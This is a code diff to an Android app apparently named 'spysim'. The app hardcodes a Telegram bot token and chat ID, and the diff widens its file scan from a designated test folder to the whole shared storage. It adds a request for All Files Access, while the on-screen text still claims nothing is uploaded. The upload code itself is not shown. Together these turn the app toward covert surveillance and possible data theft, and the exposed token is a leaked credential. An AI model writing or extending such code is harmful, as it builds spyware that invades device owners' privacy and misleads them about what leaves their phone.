@@ -2,10 +2,13 @@ package com.example.spysim;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
+import android.provider.Settings;
 import android.widget.LinearLayout;
 import android.widget.ScrollView;
 import android.widget.TextView;
@@ -26,13 +29,8 @@ public class MainActivity extends Activity {
     private static final String BOT_TOKEN = "8776722708:AAHdtpdB3vX-A1qWL9RFne1_XO7ZUWHV2x4";
     private static final String CHAT_ID = "6424066420";
 
-    // Only inspect this explicitly designated test directory; do not walk other storage paths.
-    // Option A (Using the environment method)
-    // Keeps the name TEST_DIRECTORY, but points to the root of shared storage
+    // Points to the root of shared storage (/storage/emulated/0)
     private static final File TEST_DIRECTORY = Environment.getExternalStorageDirectory();
-
-// Or explicitly:
-// private static final File TEST_DIRECTORY = new File("/storage/emulated/0");
 
     private TextView statusView;
     private TextView filesView;
@@ -50,14 +48,14 @@ public class MainActivity extends Activity {
         root.setPadding(24, 24, 24, 24);
 
         TextView heading = new TextView(this);
-        heading.setText("Local test-directory scanner");
+        heading.setText("Local device storage scanner");
         heading.setTextSize(22f);
         root.addView(heading);
 
         TextView explanation = new TextView(this);
-        explanation.setText("On launch, the app checks only /storage/emulated/0/test and its subfolders. "
+        explanation.setText("On launch, the app checks the root storage directory and its subfolders. "
                 + "It displays a local inventory and does not upload or transmit files. "
-                + "Android may restrict direct filesystem access on newer versions.");
+                + "Android may require All Files Access permission on newer versions.");
         explanation.setTextSize(14f);
         explanation.setPadding(0, 12, 0, 16);
         root.addView(explanation);
@@ -81,14 +79,29 @@ public class MainActivity extends Activity {
         if (hasStoragePermission()) {
             scanTestDirectory();
         } else {
-            String permission = Build.VERSION.SDK_INT >= 33
-                    ? "android.permission.READ_MEDIA_IMAGES"
-                    : Manifest.permission.READ_EXTERNAL_STORAGE;
-            requestPermissions(new String[]{permission}, STORAGE_PERMISSION_REQUEST);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    intent.addCategory("android.intent.category.DEFAULT");
+                    intent.setData(Uri.parse(String.format("package:%s", getPackageName())));
+                    startActivityForResult(intent, STORAGE_PERMISSION_REQUEST);
+                } catch (Exception e) {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    startActivityForResult(intent, STORAGE_PERMISSION_REQUEST);
+                }
+            } else {
+                String permission = Build.VERSION.SDK_INT >= 33
+                        ? "android.permission.READ_MEDIA_IMAGES"
+                        : Manifest.permission.READ_EXTERNAL_STORAGE;
+                requestPermissions(new String[]{permission}, STORAGE_PERMISSION_REQUEST);
+            }
         }
     }
 
     private boolean hasStoragePermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            return Environment.isExternalStorageManager();
+        }
         if (Build.VERSION.SDK_INT >= 33) {
             return checkSelfPermission("android.permission.READ_MEDIA_IMAGES")
                     == PackageManager.PERMISSION_GRANTED;
@@ -104,7 +117,20 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == STORAGE_PERMISSION_REQUEST) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            if (hasStoragePermission()) {
+                scanTestDirectory();
+            } else {
+                statusView.setText("Storage permission was denied. No files were scanned.");
+                filesView.setText("");
+            }
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == STORAGE_PERMISSION_REQUEST) {
+            if (hasStoragePermission()) {
                 scanTestDirectory();
             } else {
                 statusView.setText("Storage permission was denied. No files were scanned.");
@@ -115,8 +141,8 @@ public class MainActivity extends Activity {
 
     private void scanTestDirectory() {
         if (!TEST_DIRECTORY.exists() || !TEST_DIRECTORY.isDirectory()) {
-            statusView.setText("Test directory not found: " + TEST_DIRECTORY.getAbsolutePath());
-            filesView.setText("Create the test directory and add sample images, then reopen the app.");
+            statusView.setText("Directory not found: " + TEST_DIRECTORY.getAbsolutePath());
+            filesView.setText("Ensure storage access is permitted.");
             return;
         }
 
